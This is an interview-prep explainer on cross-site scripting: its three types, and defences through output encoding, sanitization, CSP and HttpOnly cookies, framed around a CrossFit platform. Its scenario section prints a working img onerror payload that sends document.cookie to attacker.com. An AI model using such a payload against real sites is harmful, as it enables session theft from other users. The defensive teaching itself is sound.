**XSS (Cross-Site Scripting)** is a vulnerability where an attacker injects malicious scripts into web pages viewed by other users.

---

## 1. How XSS Works

The core of the attack is **Lack of Sanitization**. The application takes user input and renders it directly into the HTML without checking for executable code.

### The Three Main Types

| Type | Description | Example |
| --- | --- | --- |
| **Stored (Persistent)** | The script is permanently stored on the server (e.g., in a database). | A user sets their "Workout Name" to `<script>steal_cookie()</script>`. Every athlete who views that workout executes the script. |
| **Reflected** | The script is "reflected" off the web server, usually via a URL parameter. | A link like `?search=<script>...</script>`. The server includes that string in the search results page. |
| **DOM-based** | The vulnerability exists entirely in the client-side code, not the server. | JavaScript reads a fragment from the URL (`#`) and writes it directly to the page using `innerHTML`. |

---

## 2. Prevention Strategies

For a senior role, "just use a library" isn't enough. You need to explain the **Defense in Depth** layers.

### Layer 1: Output Encoding (The most important)

Never trust data being rendered. Before putting user-supplied data into HTML, encode it so the browser treats it as text, not code.

* **Raw:** `<script>`
* **Encoded:** `&lt;script&gt;`

**In Java/Spring:** Use Thymeleaf or Freemarker (which encode by default).
**In React:** `{{ user_input }}` is automatically escaped. Avoid `dangerouslySetInnerHTML`.

### Layer 2: Input Validation/Sanitization

Strip out dangerous tags (like `<script>`, `<iframe>`, `<a>` with `javascript:` links) on the way in.

* *Note:* Validation is good for business logic (e.g., "is this a valid date?"), but **Encoding** is the primary fix for XSS.

### Layer 3: Content Security Policy (CSP)

This is a powerful browser-level defense. You send a header telling the browser: *"Only execute scripts from my own domain (myself.com)."*

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;

```

If an attacker manages to inject a script, the browser will refuse to run it because it doesn't match the CSP.

### Layer 4: Cookie Security

If you are storing your **JWT** in a cookie:

* **HttpOnly:** This flag prevents JavaScript from accessing the cookie. If an XSS attack occurs, the script cannot "see" your session token to steal it.
* **Secure:** Ensures the cookie is only sent over HTTPS.

---

## 3. Real-World Scenario: Your CrossFit Platform

Imagine you have a "Comments" section for a WOD (Workout of the Day).

1. **The Attack:** A user posts a comment:
`<img src=x onerror="fetch('[https://attacker.com/steal?cookie=](https://attacker.com/steal?cookie=)' + document.cookie)">`
2. **The Result:** The browser tries to load an image from `x` (which fails), triggers the `onerror` event, and sends the viewer's cookies to the attacker.
3. **The Fix:**
* **Backend:** Use a library like `Bleach` (Python) or `OWASP Java HTML Sanitizer` to clean the comment.
* **Frontend:** Ensure your UI framework (React/Flutter) escapes the string.
* **Browser:** Set the `HttpOnly` flag on your auth cookies.



---

## 4. Interview "Pro-Tips"

* **Context Matters:** Mention that encoding needs to change based on *where* the data goes. Encoding for an HTML body is different from encoding for an HTML attribute or a JavaScript variable.
* **Frameworks aren't perfect:** Mention that while modern frameworks (React/Vue) handle most XSS, they don't protect against "Attribute Injection" if you are dynamically building URLs (e.g., `href={userLink}`).
